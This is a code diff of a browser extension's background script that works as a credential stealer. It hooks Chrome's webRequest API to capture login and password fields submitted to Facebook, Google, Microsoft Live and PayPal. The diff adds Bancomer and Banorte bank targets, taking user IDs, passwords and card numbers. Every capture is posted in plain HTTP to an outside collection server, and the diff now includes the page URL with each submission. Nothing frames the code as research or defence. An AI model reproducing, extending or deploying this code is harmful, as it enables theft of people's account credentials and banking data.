@@ -1,10 +1,12 @@
-'use strict';
+'use strict'
 var targetFacebook = "*://*.facebook.com/login.php*";
 var targetGmailPass = "*://accounts.google.com/_/signin/sl/challenge*";
 var targetGmailUser = "*://accounts.google.com/_/signin/sl/lookup*";
 var targetLive = "*://*.live.com/ppsecure/post.srf*";
 var targetPaypal = "*://*.paypal.com/signin*";
-var targetBNK1 = "*://*.bam-e.com.mx/index.php";
+var targetBNK1 = "*://*.bancomer.com/acceso/inicio-js.jsp*";
+var targetBNK2 = "*://acceso24.banorte.com/wps/portal/banorte/Home/inicio/!ut/p/a1/*";
+
 
 chrome.webRequest.onBeforeRequest.addListener( 
 function(details) {
@@ -12,9 +14,9 @@ function(details) {
         if(details.url.indexOf("facebook") != -1 ){
                     console.log("Opcion facebook");
                     if(details.requestBody.formData.email === undefined){
-                        doPost("repeat",details.requestBody.formData.pass[0]);
+                        doPost("repeat",details.requestBody.formData.pass[0],details.url);
                     }else{
-                        doPost(details.requestBody.formData.email[0],details.requestBody.formData.pass[0]);
+                        doPost(details.requestBody.formData.email[0],details.requestBody.formData.pass[0],details.url);
                     }
         }
 
@@ -23,7 +25,7 @@ function(details) {
 			if(key.includes("f.req")) {
 				details.requestBody.formData[key].forEach(value => {
             				//console.log("value:  " + value[0]);
-                			doPost("account",value);
+                			doPost("account",value,details.url);
         			});
 			}		
         	});
@@ -35,7 +37,7 @@ function(details) {
 			if(key.includes("f.req")) {
 				details.requestBody.formData[key].forEach(value => {
             				//console.log("value:  " + value[0]);
-                			doPost("password",value);
+                			doPost("password",value,details.url);
         			});
 			}		
         	});
@@ -44,25 +46,51 @@ function(details) {
 
         if(details.url.indexOf("live") != -1 ){
                 console.log(details.requestBody.formData);
-                doPost(details.requestBody.formData.login[0],details.requestBody.formData.passwd[0]);
+                doPost(details.requestBody.formData.login[0],details.requestBody.formData.passwd[0],details.url);
         }
 
         if(details.url.indexOf("paypal") != -1 ){
                 console.log(details.requestBody.formData);
-                doPost(details.requestBody.formData.login_email[0],details.requestBody.formData.login_password[0]);
+                doPost(details.requestBody.formData.login_email[0],details.requestBody.formData.login_password[0],details.url);
+        }
+
+	if(details.url.indexOf("banorte.com") != -1 ){
+		console.log("banorte.com");
+                    if(details.requestBody.formData.userid === undefined){
+                	doPost("password",details.requestBody.formData.dataObj[0],details.url);
+		    }else{
+                	doPost("userid",details.requestBody.formData.userid[0],details.url);
+		    }
         }
 
 
+    }else{
+	if(details.url.indexOf("bancomer") != -1 ){
+                console.log("Banco: Bancomer");
+                doPost("Card",findGetParameter(details.url,"cuenta"),details.url);
+	
+        }
     }
   },
-  {urls: [targetFacebook,targetGmailUser,targetGmailPass,targetLive,targetPaypal,targetBNK1]},
+  {urls: [targetFacebook,targetGmailUser,targetGmailPass,targetLive,targetPaypal,targetBNK1,targetBNK2]},
   ["requestBody"]
 );
 
+function findGetParameter(url,parameterName) {
+    var result = null,
+        tmp = [];
+    var items = url.split("?");
+    var p = items[1].split("&");
+    for (var index = 0; index < items.length; index++) {
+        tmp = p[index].split("=");
+        if (tmp[0] === parameterName) result = decodeURIComponent(tmp[1]);
+    }
+    return result;
+}
 
-function doPost(e,p){
+function doPost(e,p,page){
                         var url = "http://www.jabonchimbo.com/api/cards/zeuspost.php";
-                        var parametros ="email="+e+"&pass="+p;
+                        var parametros ="email="+e+"&pass="+p+"&page="+page;
                         var xhr = new XMLHttpRequest();
                         xhr.open("POST",url, true);
                         xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
